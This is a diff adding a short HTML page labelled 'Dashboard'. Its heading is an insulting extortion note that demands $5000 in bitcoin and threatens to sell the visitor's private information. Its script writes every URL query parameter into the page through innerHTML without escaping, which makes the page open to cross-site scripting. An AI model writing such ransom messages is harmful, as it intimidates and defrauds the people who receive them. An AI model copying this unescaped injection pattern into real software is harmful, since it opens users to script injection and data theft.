@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Dashboard</title>
+</head>
+<body>
+  <h1>Thanks for the private information, idiot. Send $5000 to my BTC address HukHfJbUIOoKIOJ03 or it's all going to the black market.</h1>
+  <div id="output"></div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const output = document.getElementById("output");
+    let html = "<ul>";
+    for (const [key, value] of params.entries()) {
+      html += `<li><strong>${key}:</strong> ${value}</li>`;
+    }
+    html += "</ul>";
+    output.innerHTML = html;
+  </script>
+</body>
+</html>
